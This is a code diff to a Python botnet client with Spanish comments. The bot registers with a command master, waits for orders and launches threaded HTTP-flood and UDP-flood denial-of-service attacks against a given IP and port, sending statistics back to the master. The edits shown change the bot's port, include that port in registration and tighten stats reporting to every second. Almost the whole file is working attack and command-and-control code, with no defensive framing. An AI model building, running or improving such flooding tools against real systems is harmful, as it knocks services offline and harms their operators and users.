@@ -5,27 +5,28 @@ import requests
 import random
 import time
 
+# === CONFIGURACIÓN ===
 MASTER_IP = '127.0.0.1'
 MASTER_COMMAND_PORT = 65432
 MASTER_RESPONSE_PORT = 65433
-BOT_PORT = 65440
+BOT_PORT = 65441  
 
 stop_event = threading.Event()
 attack_threads = []
 response_lock = threading.Lock()
 
-# Registrar bot con el master
+# === REGISTRO CON EL MASTER ===
 def register():
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((MASTER_IP, MASTER_COMMAND_PORT))
-            s.sendall(b'REGISTER_BOT')
-            print("[+] Bot registrado con Master")
+            msg = f"REGISTER_BOT {BOT_PORT}"
+            s.sendall(msg.encode())
+            print(f"[+] Bot registrado con Master en puerto {BOT_PORT}")
     except Exception as e:
         print(f"[!] Error al registrar: {e}")
 
-# Ejecutar ataque HTTP
-
+# === ATAQUE HTTP FLOOD ===
 def http_flood(target_ip, target_port, duration):
     url = f"http://{target_ip}:{target_port}/"
     end = time.time() + duration
@@ -43,20 +44,18 @@ def http_flood(target_ip, target_port, duration):
         except requests.RequestException:
             continue
 
-        if time.time() - last_report >= 5:
+        if time.time() - last_report >= 1:
             avg = sum(local_rts) / local_total if local_total else 0
             report_stats(local_total, avg, local_rts)
             last_report = time.time()
             local_rts = []
             local_total = 0
 
-    # Final envío
     if local_total > 0:
         avg = sum(local_rts) / local_total
         report_stats(local_total, avg, local_rts)
 
-# Ejecutar ataque UDP
-
+# === ATAQUE UDP FLOOD ===
 def udp_flood(target_ip, target_port, duration):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = random._urandom(1024)
@@ -71,8 +70,7 @@ def udp_flood(target_ip, target_port, duration):
     sock.close()
     report_stats(total, 0.0, [])
 
-# Reportar estadísticas al master
-
+# === ENVÍO DE ESTADÍSTICAS ===
 def report_stats(total, avg, rts):
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -83,8 +81,8 @@ def report_stats(total, avg, rts):
             print(f"[>] Estadísticas enviadas: {total} reqs, avg {avg:.2f} ms")
     except Exception as e:
         print(f"[!] Error enviando stats: {e}")
-# Iniciar ataque con hilos
 
+# === INICIAR ATAQUE CON HILOS ===
 def start_attack(attack_type, ip, port, threads, duration):
     stop_event.clear()
     attack_threads.clear()
@@ -96,14 +94,13 @@ def start_attack(attack_type, ip, port, threads, duration):
     for t in attack_threads:
         t.join()
 
-# Parar ataque
+# === PARAR ATAQUE ===
 def stop_attack():
     stop_event.set()
     for t in attack_threads:
         t.join()
 
-# Escuchar órdenes del master
-
+# === ESCUCHAR COMANDOS DEL MASTER ===
 def listen():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         try:
@@ -130,6 +127,7 @@ def handle_command(conn):
         except Exception as e:
             print(f"[!] Error comando: {e}")
 
+# === INICIO DEL BOT ===
 if __name__ == '__main__':
     print("[+] Iniciando bot...")
     register()
